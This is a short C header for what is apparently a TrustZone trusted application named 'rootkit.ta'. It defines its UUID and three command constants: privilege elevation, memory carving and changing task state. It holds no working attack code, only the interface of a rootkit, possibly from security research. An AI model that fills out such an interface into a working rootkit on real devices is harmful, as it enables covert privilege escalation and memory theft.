#define TA_NAME "rootkit.ta"

// Randomly generated UUID for the TA.
// Must be known to normal world client applications.
#define ROOTKIT_TA_UUID \
    { 0x90998449, 0xb9e7, 0x483b, \
    { 0x96, 0x1c, 0x25, 0x1f, 0x2a, 0x3f, 0x50, 0xe5 } }

// TA commands
#define ELEVATE_PRIVILEGES 0
#define MEMORY_CARVING 1
#define CHANGE_TASK_STATE 2 
